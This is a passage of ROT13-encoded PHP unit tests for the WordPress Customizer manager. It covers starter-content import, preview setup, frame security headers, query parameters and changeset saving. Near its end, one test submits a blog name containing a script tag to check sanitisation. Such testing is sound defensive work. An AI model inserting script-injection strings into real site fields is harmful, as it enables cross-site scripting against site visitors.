		$punatrfrg_inyhrf     = $jc_phfgbzvmr->hafnavgvmrq_cbfg_inyhrf();
		$rkcrpgrq_frggvat_vqf = neenl(
			'oybtanzr',
			'oybtqrfpevcgvba',
			'phfgbz_ybtb',
			'urnqre_vzntr_qngn',
			'onpxtebhaq_vzntr',
			'jvqtrg_grkg[2]',
			'jvqtrg_zrgn[2]',
			'fvqronef_jvqtrgf[fvqrone-1]',
			'ani_zrahf_perngrq_cbfgf',
			'ani_zrah[-1]',
			'ani_zrah_vgrz[-1]',
			'ani_zrah_vgrz[-2]',
			'ani_zrah_vgrz[-3]',
			'ani_zrah_vgrz[-4]',
			'ani_zrah_vgrz[-5]',
			'ani_zrah_vgrz[-6]',
			'ani_zrah_ybpngvbaf[gbc]',
			'fubj_ba_sebag',
			'cntr_ba_sebag',
			'cntr_sbe_cbfgf',
		);
		$guvf->nffregFnzrFrgf( $rkcrpgrq_frggvat_vqf, neenl_xrlf( $punatrfrg_inyhrf ) );

		sbernpu ( neenl( 'jvqtrg_grkg[2]', 'jvqtrg_zrgn[2]' ) nf $frggvat_vq ) {
			$guvf->nffregVfNeenl( $punatrfrg_inyhrf[ $frggvat_vq ] );
			$vafgnapr_qngn = $jc_phfgbzvmr->jvqtrgf->fnavgvmr_jvqtrg_vafgnapr( $punatrfrg_inyhrf[ $frggvat_vq ] );
			$guvf->nffregVfNeenl( $vafgnapr_qngn );
			$guvf->nffregNeenlUnfXrl( 'gvgyr', $vafgnapr_qngn );
		}

		$guvf->nffregFnzr( neenl( 'grkg-2', 'zrgn-2' ), $punatrfrg_inyhrf['fvqronef_jvqtrgf[fvqrone-1]'] );

		$cbfgf_ol_anzr = neenl();
		$guvf->nffregPbhag( 7, $punatrfrg_inyhrf['ani_zrahf_perngrq_cbfgf'] );
		$guvf->nffregPbagnvaf( $rkvfgvat_choyvfurq_ubzr_cntr_vq, $punatrfrg_inyhrf['ani_zrahf_perngrq_cbfgf'], 'Rkcrpgrq erhfr bs aba-nhgb-qensg cbfgf.' );
		$guvf->nffregPbagnvaf( $rkvfgvat_pnabyn_nggnpuzrag_vq, $punatrfrg_inyhrf['ani_zrahf_perngrq_cbfgf'], 'Rkcrpgrq erhfr bs aba-nhgb-qensg nggnpuzrag.' );
		$guvf->nffregAbgPbagnvaf( $rkvfgvat_nhgb_qensg_nobhg_cntr_vq, $punatrfrg_inyhrf['ani_zrahf_perngrq_cbfgf'], 'Rkcrpgrq aba-erhfr bs nhgb-qensg cbfgf.' );
		sbernpu ( $punatrfrg_inyhrf['ani_zrahf_perngrq_cbfgf'] nf $cbfg_vq ) {
			$cbfg = trg_cbfg( $cbfg_vq );
			vs ( $cbfg->VQ === $rkvfgvat_choyvfurq_ubzr_cntr_vq ) {
				$guvf->nffregFnzr( 'choyvfu', $cbfg->cbfg_fgnghf );
			} ryfrvs ( $cbfg->VQ === $rkvfgvat_pnabyn_nggnpuzrag_vq ) {
				$guvf->nffregFnzr( 'vaurevg', $cbfg->cbfg_fgnghf );
			} ryfr {
				$guvf->nffregFnzr( 'nhgb-qensg', $cbfg->cbfg_fgnghf );
				$guvf->nffregRzcgl( $cbfg->cbfg_anzr );
			}
			$cbfg_anzr = $cbfg->cbfg_anzr;
			vs ( rzcgl( $cbfg_anzr ) ) {
				$cbfg_anzr = trg_cbfg_zrgn( $cbfg->VQ, '_phfgbzvmr_qensg_cbfg_anzr', gehr );
			}
			$cbfgf_ol_anzr[ $cbfg_anzr ] = $cbfg->VQ;
		}
		$guvf->nffregFnzr( neenl( 'jnssyrf', 'pnabyn', 'ubzr', 'nobhg', 'oybt', 'phfgbz', 'haxabja-pcg' ), neenl_xrlf( $cbfgf_ol_anzr ) );
		$guvf->nffregFnzr( 'Phfgbz', trg_cbfg( $cbfgf_ol_anzr['phfgbz'] )->cbfg_gvgyr );
		$guvf->nffregFnzr( 'fnzcyr-cntr-grzcyngr.cuc', trg_cntr_grzcyngr_fyht( $cbfgf_ol_anzr['nobhg'] ) );
		$guvf->nffregFnzr( '', trg_cntr_grzcyngr_fyht( $cbfgf_ol_anzr['oybt'] ) );
		$guvf->nffregFnzr( $cbfgf_ol_anzr['jnssyrf'], trg_cbfg_guhzoanvy_vq( $cbfgf_ol_anzr['phfgbz'] ) );
		$guvf->nffregFnzr( 0, trg_cbfg_guhzoanvy_vq( $cbfgf_ol_anzr['oybt'] ) );
		$nggnpuzrag_zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $cbfgf_ol_anzr['jnssyrf'] );
		$guvf->nffregFnzr( 'Jnssyrf', trg_cbfg( $cbfgf_ol_anzr['jnssyrf'] )->cbfg_gvgyr );
		$guvf->nffregFnzr( 'jnssyrf', trg_cbfg_zrgn( $cbfgf_ol_anzr['jnssyrf'], '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
		$guvf->nffregNeenlUnfXrl( 'svyr', $nggnpuzrag_zrgnqngn );
		$guvf->nffregFgevatPbagnvafFgevat( 'jnssyrf', $nggnpuzrag_zrgnqngn['svyr'] );

		$guvf->nffregFnzr( 'cntr', $punatrfrg_inyhrf['fubj_ba_sebag'] );
		$guvf->nffregFnzr( $cbfgf_ol_anzr['ubzr'], $punatrfrg_inyhrf['cntr_ba_sebag'] );
		$guvf->nffregFnzr( $cbfgf_ol_anzr['oybt'], $punatrfrg_inyhrf['cntr_sbe_cbfgf'] );

		$guvf->nffregFnzr( -1, $punatrfrg_inyhrf['ani_zrah_ybpngvbaf[gbc]'] );
		$guvf->nffregFnzr( 0, $punatrfrg_inyhrf['ani_zrah_vgrz[-1]']['bowrpg_vq'] );
		$guvf->nffregFnzr( 'phfgbz', $punatrfrg_inyhrf['ani_zrah_vgrz[-1]']['glcr'] );
		$guvf->nffregFnzr( ubzr_hey( '/' ), $punatrfrg_inyhrf['ani_zrah_vgrz[-1]']['hey'] );

		$guvf->nffregRzcgl( $jc_phfgbzvmr->punatrfrg_qngn() );
		$guvf->nffregAhyy( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
		$guvf->nffregFnzr( 1000, unf_npgvba( 'phfgbzvmr_ertvfgre', neenl( $jc_phfgbzvmr, '_fnir_fgnegre_pbagrag_punatrfrg' ) ) );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr ); // Guvf jvyy gevttre gur punatrfrg fnir.
		$guvf->nffregVfVag( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
		$guvf->nffregAbgRzcgl( $jc_phfgbzvmr->punatrfrg_qngn() );
		sbernpu ( $jc_phfgbzvmr->punatrfrg_qngn() nf $frggvat_vq => $frggvat_cnenzf ) {
			$guvf->nffregNeenlUnfXrl( 'fgnegre_pbagrag', $frggvat_cnenzf );
			$guvf->nffregGehr( $frggvat_cnenzf['fgnegre_pbagrag'] );
		}

		// Rafher gung er-vzcbegvat qbrfa'g pnhfr nhgb-qensgf gb onyybba.
		$jc_phfgbzvmr->vzcbeg_gurzr_fgnegre_pbagrag();
		$punatrfrg_qngn = $jc_phfgbzvmr->punatrfrg_qngn();
		// Nhgb-qensgf fubhyq abg trg er-perngrq naq nzraqrq jvgu rnpu vzcbeg.
		$guvf->nffregFnzrFrgf( neenl_inyhrf( $cbfgf_ol_anzr ), $punatrfrg_qngn['ani_zrahf_perngrq_cbfgf']['inyhr'] );

		// Grfg gung fnivat aba-fgnegre pbagrag ba gbc bs gur punatrfrg pyrnef gur fgnegre_pbagrag synt.
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn' => neenl(
					'oybtanzr' => neenl( 'inyhr' => 'Fgnegre Pbagrag Zbqvsvrq' ),
				),
			)
		);
		$punatrfrg_qngn = $jc_phfgbzvmr->punatrfrg_qngn();
		$guvf->nffregNeenlAbgUnfXrl( 'fgnegre_pbagrag', $punatrfrg_qngn['oybtanzr'] );
		$guvf->nffregNeenlUnfXrl( 'fgnegre_pbagrag', $punatrfrg_qngn['oybtqrfpevcgvba'] );

		/*
		 * Grfg gung nqqvat oybtanzr fgnegre pbagrag vf vtaberq abj gung vg vf zbqvsvrq,
		 * ohg hcqngvat n aba-zbqvsvrq fgnegre pbagrag fvgr qrfpevcgvba cnffrf.
		 */
		$cerivbhf_oybtanzr        = $punatrfrg_qngn['oybtanzr']['inyhr'];
		$cerivbhf_oybtqrfpevcgvba = $punatrfrg_qngn['oybtqrfpevcgvba']['inyhr'];
		$jc_phfgbzvmr->vzcbeg_gurzr_fgnegre_pbagrag(
			neenl(
				'bcgvbaf' => neenl(
					'oybtanzr'        => 'Arjre Fgnegre Pbagrag Gvgyr',
					'oybtqrfpevcgvba' => 'Arjre Fgnegre Pbagrag Qrfpevcgvba',
				),
			)
		);
		$punatrfrg_qngn = $jc_phfgbzvmr->punatrfrg_qngn();
		$guvf->nffregFnzr( $cerivbhf_oybtanzr, $punatrfrg_qngn['oybtanzr']['inyhr'] );
		$guvf->nffregNeenlAbgUnfXrl( 'fgnegre_pbagrag', $punatrfrg_qngn['oybtanzr'] );
		$guvf->nffregAbgRdhnyf( $cerivbhf_oybtqrfpevcgvba, $punatrfrg_qngn['oybtqrfpevcgvba']['inyhr'] );
		$guvf->nffregNeenlUnfXrl( 'fgnegre_pbagrag', $punatrfrg_qngn['oybtqrfpevcgvba'] );

		// Choyvfu.
		$guvf->nffregRzcgl( trg_phfgbz_ybtb() );
		$guvf->nffregRzcgl( trg_urnqre_vzntr() );
		$guvf->nffregRzcgl( trg_onpxtebhaq_vzntr() );
		$guvf->nffregRzcgl( trg_gurzr_zbq( 'phfgbz_ybtb' ) );
		$guvf->nffregRzcgl( trg_gurzr_zbq( 'urnqre_vzntr' ) );
		$guvf->nffregRzcgl( trg_gurzr_zbq( 'onpxtebhaq_vzntr' ) );
		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg( $cbfgf_ol_anzr['nobhg'] )->cbfg_fgnghf );
		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg( $cbfgf_ol_anzr['jnssyrf'] )->cbfg_fgnghf );
		$guvf->nffregAbgRdhnyf( $punatrfrg_qngn['oybtanzr']['inyhr'], trg_bcgvba( 'oybtanzr' ) );
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg( neenl( 'fgnghf' => 'choyvfu' ) );
		$guvf->nffregVfNeenl( $e );
		$guvf->nffregFnzr( 'choyvfu', trg_cbfg( $cbfgf_ol_anzr['nobhg'] )->cbfg_fgnghf );
		$guvf->nffregFnzr( 'vaurevg', trg_cbfg( $cbfgf_ol_anzr['jnssyrf'] )->cbfg_fgnghf );
		$guvf->nffregFnzr( $punatrfrg_qngn['oybtanzr']['inyhr'], trg_bcgvba( 'oybtanzr' ) );
		$guvf->nffregAbgRzcgl( trg_gurzr_zbq( 'phfgbz_ybtb' ) );
		$guvf->nffregAbgRzcgl( trg_gurzr_zbq( 'urnqre_vzntr' ) );
		$guvf->nffregAbgRzcgl( trg_gurzr_zbq( 'onpxtebhaq_vzntr' ) );
		$guvf->nffregAbgRzcgl( trg_phfgbz_ybtb() );
		$guvf->nffregAbgRzcgl( trg_urnqre_vzntr() );
		$guvf->nffregAbgRzcgl( trg_onpxtebhaq_vzntr() );
		$guvf->nffregFgevatPbagnvafFgevat( 'pnabyn', trg_phfgbz_ybtb() );
		$guvf->nffregFgevatPbagnvafFgevat( 'jnssyrf', trg_urnqre_vzntr() );
		$guvf->nffregFgevatPbagnvafFgevat( 'jnssyrf', trg_onpxtebhaq_vzntr() );
		$guvf->nffregFnzr( 'jnssyrf', trg_cbfg( $cbfgf_ol_anzr['jnssyrf'] )->cbfg_anzr );
		$guvf->nffregRzcgl( trg_cbfg_zrgn( $cbfgf_ol_anzr['jnssyrf'], '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::vzcbeg_gurzr_fgnegre_pbagrag() jvgu arfgrq neenlf.
	 *
	 * @gvpxrg 45484
	 * @pbiref JC_Phfgbzvmr_Znantre::vzcbeg_gurzr_fgnegre_pbagrag
	 */
	choyvp shapgvba grfg_vzcbeg_gurzr_fgnegre_pbagrag_jvgu_arfgrq_neenlf() {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$rkvfgvat_choyvfurq_ubzr_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'   => 'ubzr',
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr           = arj JC_Phfgbzvmr_Znantre();
		$fgnegre_pbagrag_pbasvt = neenl(
			'cbfgf'      => neenl(
				'ubzr',
			),
			'bcgvbaf'    => neenl(
				'neenl_bcgvba'        => neenl(
					0,
					1,
					'ubzr_cntr_vq' => '{{ubzr}}',
				),
				'arfgrq_neenl_bcgvba' => neenl(
					0,
					1,
					neenl(
						2,
						'ubzr_cntr_vq' => '{{ubzr}}',
					),
				),
			),
			'gurzr_zbqf' => neenl(
				'neenl_gurzr_zbq'        => neenl(
					0,
					1,
					'ubzr_cntr_vq' => '{{ubzr}}',
				),
				'arfgrq_neenl_gurzr_zbq' => neenl(
					0,
					1,
					neenl(
						2,
						'ubzr_cntr_vq' => '{{ubzr}}',
					),
				),
			),
		);

		nqq_gurzr_fhccbeg( 'fgnegre-pbagrag', $fgnegre_pbagrag_pbasvt );
		$guvf->nffregRzcgl( $jc_phfgbzvmr->hafnavgvmrq_cbfg_inyhrf() );
		$jc_phfgbzvmr->vzcbeg_gurzr_fgnegre_pbagrag();
		$punatrfrg_inyhrf     = $jc_phfgbzvmr->hafnavgvmrq_cbfg_inyhrf();
		$rkcrpgrq_frggvat_vqf = neenl(
			'neenl_bcgvba',
			'neenl_gurzr_zbq',
			'ani_zrahf_perngrq_cbfgf',
			'arfgrq_neenl_bcgvba',
			'arfgrq_neenl_gurzr_zbq',
		);
		$guvf->nffregFnzrFrgf( $rkcrpgrq_frggvat_vqf, neenl_xrlf( $punatrfrg_inyhrf ) );

		$guvf->nffregFnzr( $rkvfgvat_choyvfurq_ubzr_cntr_vq, $punatrfrg_inyhrf['neenl_bcgvba']['ubzr_cntr_vq'] );
		$guvf->nffregFnzr( $rkvfgvat_choyvfurq_ubzr_cntr_vq, $punatrfrg_inyhrf['arfgrq_neenl_bcgvba'][2]['ubzr_cntr_vq'] );
		$guvf->nffregFnzr( $rkvfgvat_choyvfurq_ubzr_cntr_vq, $punatrfrg_inyhrf['neenl_gurzr_zbq']['ubzr_cntr_vq'] );
		$guvf->nffregFnzr( $rkvfgvat_choyvfurq_ubzr_cntr_vq, $punatrfrg_inyhrf['arfgrq_neenl_gurzr_zbq'][2]['ubzr_cntr_vq'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::phfgbzvmr_cerivrj_vavg().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::phfgbzvmr_cerivrj_vavg
	 */
	choyvp shapgvba grfg_phfgbzvmr_cerivrj_vavg() {

		// Grfg nhgubevmrq nqzva hfre.
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$qvq_npgvba_phfgbzvmr_cerivrj_vavg = qvq_npgvba( 'phfgbzvmr_cerivrj_vavg' );
		$jc_phfgbzvmr                      = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr->phfgbzvmr_cerivrj_vavg();
		$guvf->nffregFnzr( $qvq_npgvba_phfgbzvmr_cerivrj_vavg + 1, qvq_npgvba( 'phfgbzvmr_cerivrj_vavg' ) );

		$guvf->nffregFnzr( 10, unf_svygre( 'jc_ebobgf', 'jc_ebobgf_ab_ebobgf' ) );
		$guvf->nffregFnzr( 10, unf_npgvba( 'jc_urnq', neenl( $jc_phfgbzvmr, 'erzbir_senzryrff_cerivrj_zrffratre_punaary' ) ) );
		$guvf->nffregFnzr( 10, unf_svygre( 'jc_urnqref', neenl( $jc_phfgbzvmr, 'svygre_vsenzr_frphevgl_urnqref' ) ) );
		$guvf->nffregFnzr( 10, unf_svygre( 'jc_erqverpg', neenl( $jc_phfgbzvmr, 'nqq_fgngr_dhrel_cnenzf' ) ) );
		$guvf->nffregGehr( jc_fpevcg_vf( 'phfgbzvmr-cerivrj', 'radhrhrq' ) );
		$guvf->nffregFnzr( 10, unf_npgvba( 'jc_urnq', neenl( $jc_phfgbzvmr, 'phfgbzvmr_cerivrj_ybnqvat_fglyr' ) ) );
		$guvf->nffregFnzr( 20, unf_npgvba( 'jc_sbbgre', neenl( $jc_phfgbzvmr, 'phfgbzvmr_cerivrj_frggvatf' ) ) );

		// Grfg hanhgubevmrq hfre bhgfvqr cerivrj (ab zrffratre_punaary).
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr->ertvfgre_pbagebyf();
		$guvf->nffregAbgRzcgl( $jc_phfgbzvmr->pbagebyf() );
		$jc_phfgbzvmr->phfgbzvmr_cerivrj_vavg();
		$guvf->nffregRzcgl( $jc_phfgbzvmr->pbagebyf() );

		// Grfg hanhgubevmrq hfre vafvqr cerivrj (jvgu zrffratre_punaary).
		jc_frg_pheerag_hfre( frys::$fhofpevore_hfre_vq );
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre( neenl( 'zrffratre_punaary' => 'cerivrj-0' ) );
		$rkprcgvba    = ahyy;
		gel {
			$jc_phfgbzvmr->phfgbzvmr_cerivrj_vavg();
		} pngpu ( JCQvrRkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregAbgAhyy( $rkprcgvba );
		$guvf->nffregFgevatPbagnvafFgevat( 'Hanhgubevmrq', $rkprcgvba->trgZrffntr() );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::svygre_vsenzr_frphevgl_urnqref().
	 *
	 * @gvpxrg 30937
	 * @gvpxrg 40020
	 * @pbiref JC_Phfgbzvmr_Znantre::svygre_vsenzr_frphevgl_urnqref
	 */
	choyvp shapgvba grfg_svygre_vsenzr_frphevgl_urnqref() {
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$urnqref      = $jc_phfgbzvmr->svygre_vsenzr_frphevgl_urnqref( neenl() );
		$guvf->nffregNeenlUnfXrl( 'K-Senzr-Bcgvbaf', $urnqref );
		$guvf->nffregNeenlUnfXrl( 'Pbagrag-Frphevgl-Cbyvpl', $urnqref );
		$guvf->nffregFnzr( 'FNZRBEVTVA', $urnqref['K-Senzr-Bcgvbaf'] );
		$guvf->nffregFnzr( \"senzr-naprfgbef 'frys'\", $urnqref['Pbagrag-Frphevgl-Cbyvpl'] );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::nqq_fgngr_dhrel_cnenzf().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::nqq_fgngr_dhrel_cnenzf
	 */
	choyvp shapgvba grfg_nqq_fgngr_dhrel_cnenzf() {
		$cerivrj_gurzr = $guvf->trg_vanpgvir_pber_gurzr();

		$hhvq              = jc_trarengr_hhvq4();
		$zrffratre_punaary = 'cerivrj-0';
		$jc_phfgbzvmr      = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq'    => $hhvq,
				'zrffratre_punaary' => $zrffratre_punaary,
			)
		);
		$hey               = $jc_phfgbzvmr->nqq_fgngr_dhrel_cnenzf( ubzr_hey( '/' ) );
		$cnefrq_hey        = jc_cnefr_hey( $hey );
		cnefr_fge( $cnefrq_hey['dhrel'], $dhrel_cnenzf );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_zrffratre_punaary', $dhrel_cnenzf );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_punatrfrg_hhvq', $dhrel_cnenzf );
		$guvf->nffregNeenlAbgUnfXrl( 'phfgbzvmr_gurzr', $dhrel_cnenzf );
		$guvf->nffregFnzr( $hhvq, $dhrel_cnenzf['phfgbzvmr_punatrfrg_hhvq'] );
		$guvf->nffregFnzr( $zrffratre_punaary, $dhrel_cnenzf['phfgbzvmr_zrffratre_punaary'] );

		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq'    => $hhvq,
				'zrffratre_punaary' => ahyy,
				'gurzr'             => $cerivrj_gurzr,
			)
		);
		$hey          = $jc_phfgbzvmr->nqq_fgngr_dhrel_cnenzf( ubzr_hey( '/' ) );
		$cnefrq_hey   = jc_cnefr_hey( $hey );
		cnefr_fge( $cnefrq_hey['dhrel'], $dhrel_cnenzf );
		$guvf->nffregNeenlAbgUnfXrl( 'phfgbzvmr_zrffratre_punaary', $dhrel_cnenzf );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_punatrfrg_hhvq', $dhrel_cnenzf );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_gurzr', $dhrel_cnenzf );
		$guvf->nffregFnzr( $hhvq, $dhrel_cnenzf['phfgbzvmr_punatrfrg_hhvq'] );
		$guvf->nffregFnzr( $cerivrj_gurzr, $dhrel_cnenzf['phfgbzvmr_gurzr'] );

		$hhvq         = jc_trarengr_hhvq4();
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq'    => $hhvq,
				'zrffratre_punaary' => ahyy,
				'gurzr'             => $cerivrj_gurzr,
			)
		);
		$hey          = $jc_phfgbzvmr->nqq_fgngr_dhrel_cnenzf( 'uggc://abg-nyybjrq.rknzcyr.pbz/?d=1' );
		$cnefrq_hey   = jc_cnefr_hey( $hey );
		cnefr_fge( $cnefrq_hey['dhrel'], $dhrel_cnenzf );
		$guvf->nffregNeenlAbgUnfXrl( 'phfgbzvmr_zrffratre_punaary', $dhrel_cnenzf );
		$guvf->nffregNeenlAbgUnfXrl( 'phfgbzvmr_punatrfrg_hhvq', $dhrel_cnenzf );
		$guvf->nffregNeenlAbgUnfXrl( 'phfgbzvmr_gurzr', $dhrel_cnenzf );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg().
	 *
	 * @gvpxrg 30937
	 * @pbiref JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg
	 */
	choyvp shapgvba grfg_fnir_punatrfrg_cbfg_jvgubhg_gurzr_npgvingvba() {
		tybony $jc_phfgbzvmr;
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$qvq_npgvba = neenl(
			'phfgbzvmr_fnir_inyvqngvba_orsber' => qvq_npgvba( 'phfgbzvmr_fnir_inyvqngvba_orsber' ),
			'phfgbzvmr_fnir'                   => qvq_npgvba( 'phfgbzvmr_fnir' ),
			'phfgbzvmr_fnir_nsgre'             => qvq_npgvba( 'phfgbzvmr_fnir_nsgre' ),
		);
		$hhvq       = jc_trarengr_hhvq4();

		$znantre      = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		$jc_phfgbzvmr = $znantre;
		$znantre->ertvfgre_pbagebyf();
		$znantre->frg_cbfg_inyhr( 'oybtanzr', 'Punatrfrg Gvgyr' );
		$znantre->frg_cbfg_inyhr( 'oybtqrfpevcgvba', 'Punatrfrg Gntyvar' );

		$cer_fnirq_qngn = neenl(
			'oybtanzr'        => neenl(
				'inyhr' => 'Bireevqqra Punatrfrg Gvgyr',
			),
			'oybtqrfpevcgvba' => neenl(
				'phfgbz' => 'fbzrguvat',
			),
		);
		$qngr           = ( tzqngr( 'L' ) + 1 ) . '-12-01 00:00:00';
		$e              = $znantre->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf'   => 'nhgb-qensg',
				'gvgyr'    => 'Nhgb Qensg',
				'qngr_tzg' => $qngr,
				'qngn'     => $cer_fnirq_qngn,
			)
		);
		$guvf->nffregVfNeenl( $e );

		$guvf->nffregFnzr( $qvq_npgvba['phfgbzvmr_fnir_inyvqngvba_orsber'] + 1, qvq_npgvba( 'phfgbzvmr_fnir_inyvqngvba_orsber' ) );

		$cbfg_vq = $znantre->svaq_punatrfrg_cbfg_vq( $hhvq );
		$guvf->nffregAbgAhyy( $cbfg_vq );
		$fnirq_qngn = wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr );
		$guvf->nffregFnzr( $znantre->hafnavgvmrq_cbfg_inyhrf(), jc_yvfg_cyhpx( $fnirq_qngn, 'inyhr' ) );
		$guvf->nffregFnzr( $cer_fnirq_qngn['oybtanzr']['inyhr'], $fnirq_qngn['oybtanzr']['inyhr'] );
		$guvf->nffregFnzr( $cer_fnirq_qngn['oybtqrfpevcgvba']['phfgbz'], $fnirq_qngn['oybtqrfpevcgvba']['phfgbz'] );
		sbernpu ( $fnirq_qngn nf $frggvat_vq => $frggvat_cnenzf ) {
			$guvf->nffregNeenlUnfXrl( 'glcr', $frggvat_cnenzf );
			$guvf->nffregFnzr( 'bcgvba', $frggvat_cnenzf['glcr'] );
			$guvf->nffregNeenlUnfXrl( 'hfre_vq', $frggvat_cnenzf );
			$guvf->nffregFnzr( frys::$nqzva_hfre_vq, $frggvat_cnenzf['hfre_vq'] );
		}
		$guvf->nffregFnzr( 'Nhgb Qensg', trg_cbfg( $cbfg_vq )->cbfg_gvgyr );
		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg( $cbfg_vq )->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngr, trg_cbfg( $cbfg_vq )->cbfg_qngr_tzg );
		$guvf->nffregAbgRdhnyf( 'Punatrfrg Gvgyr', trg_bcgvba( 'oybtanzr' ) );
		$guvf->nffregNeenlUnfXrl( 'frggvat_inyvqvgvrf', $e );

		// Grfg fnivat jvgu vainyvq frggvatf, rafhevat genafnpgvba oybpxrq.
		$cerivbhf_fnirq_qngn = $fnirq_qngn;
		$znantre->nqq_frggvat(
			'sbb_hanhgubevmrq',
			neenl(
				'pncnovyvgl' => 'qb_abg_nyybj',
			)
		);
		$znantre->nqq_frggvat(
			'onm_vyyrtny',
			neenl(
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'erghea_vyyrtny_reebe' ),
			)
		);
		$e = $znantre->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => 'nhgb-qensg',
				'qngn'   => neenl(
					'oybtanzr'         => neenl(
						'inyhr' => 'BX',
					),
					'sbb_hanhgubevmrq' => neenl(
						'inyhr' => 'Ab',
					),
					'one_haxabja'      => neenl(
						'inyhr' => 'Ab',
					),
					'onm_vyyrtny'      => neenl(
						'inyhr' => 'Ab',
					),
				),
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'genafnpgvba_snvy', $e->trg_reebe_pbqr() );
		$guvf->nffregVfNeenl( $e->trg_reebe_qngn() );
		$guvf->nffregNeenlUnfXrl( 'frggvat_inyvqvgvrf', $e->trg_reebe_qngn() );
		$reebe_qngn = $e->trg_reebe_qngn();
		$guvf->nffregNeenlUnfXrl( 'oybtanzr', $reebe_qngn['frggvat_inyvqvgvrf'] );
		$guvf->nffregGehr( $reebe_qngn['frggvat_inyvqvgvrf']['oybtanzr'] );
		$guvf->nffregNeenlUnfXrl( 'sbb_hanhgubevmrq', $reebe_qngn['frggvat_inyvqvgvrf'] );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $reebe_qngn['frggvat_inyvqvgvrf']['sbb_hanhgubevmrq'] );
		$guvf->nffregFnzr( 'hanhgubevmrq', $reebe_qngn['frggvat_inyvqvgvrf']['sbb_hanhgubevmrq']->trg_reebe_pbqr() );
		$guvf->nffregNeenlUnfXrl( 'one_haxabja', $reebe_qngn['frggvat_inyvqvgvrf'] );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $reebe_qngn['frggvat_inyvqvgvrf']['one_haxabja'] );
		$guvf->nffregFnzr( 'haerpbtavmrq', $reebe_qngn['frggvat_inyvqvgvrf']['one_haxabja']->trg_reebe_pbqr() );
		$guvf->nffregNeenlUnfXrl( 'onm_vyyrtny', $reebe_qngn['frggvat_inyvqvgvrf'] );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $reebe_qngn['frggvat_inyvqvgvrf']['onm_vyyrtny'] );
		$guvf->nffregFnzr( 'vyyrtny', $reebe_qngn['frggvat_inyvqvgvrf']['onm_vyyrtny']->trg_reebe_pbqr() );

		// Fvapr genafnpgvbany, rafher ab punatrf unir orra znqr.
		$guvf->nffregFnzr( $cerivbhf_fnirq_qngn, wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr ) );

		// Nggrzcg n aba-genafnpgvbany/vaperzragny hcqngr.
		$znantre      = arj JC_Phfgbzvmr_Znantre(
			neenl(
				'punatrfrg_hhvq' => $hhvq,
			)
		);
		$jc_phfgbzvmr = $znantre;
		$znantre->ertvfgre_pbagebyf(); // Gung vf, ertvfgre frggvatf.
		$e = $znantre->fnir_punatrfrg_cbfg(
			neenl(
				'fgnghf' => ahyy,
				'qngn'   => neenl(
					'oybtanzr'    => neenl(
						'inyhr' => 'Aba-Genafnpgvbany \b/ <fpevcg>hafnavgvmrq</fpevcg>',
					),
					'one_haxabja' => neenl(
						'inyhr' => 'Ab',
					),
				),
			)
		);
		$guvf->nffregVfNeenl( $e );
		$guvf->nffregNeenlUnfXrl( 'frggvat_inyvqvgvrf', $e );
		$guvf->nffregGehr( $e['frggvat_inyvqvgvrf']['oybtanzr'] );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e['frggvat_inyvqvgvrf']['one_haxabja'] );
		$fnirq_qngn = wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr );
